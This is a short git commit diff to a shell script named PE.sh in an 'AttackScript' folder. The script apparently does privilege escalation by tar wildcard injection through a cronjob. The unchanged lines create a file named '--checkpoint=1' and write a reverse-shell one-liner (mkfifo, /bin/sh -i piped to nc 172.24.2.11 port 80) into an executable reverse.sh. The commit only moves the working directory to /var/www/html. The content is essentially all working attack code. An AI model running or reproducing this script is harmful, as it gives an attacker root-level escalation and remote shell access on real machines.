7d6a661fbed2f0435675273826fbeb68a3330519
kahweiing <73683035+kahweiing@users.noreply.github.com>
2022-10-22 02:10:24 +0800

    Update PE.sh

--- AttackScript/PE.sh
+++ AttackScript/PE.sh
@@ -1,5 +1,5 @@
 echo "Setting up tar command injection via cronjob"
-cd /tmp;
+cd /var/www/html;
 touch -- --checkpoint=1;
 echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.24.2.11 80 >/tmp/f' > reverse.sh;
 chmod +x reverse.sh;
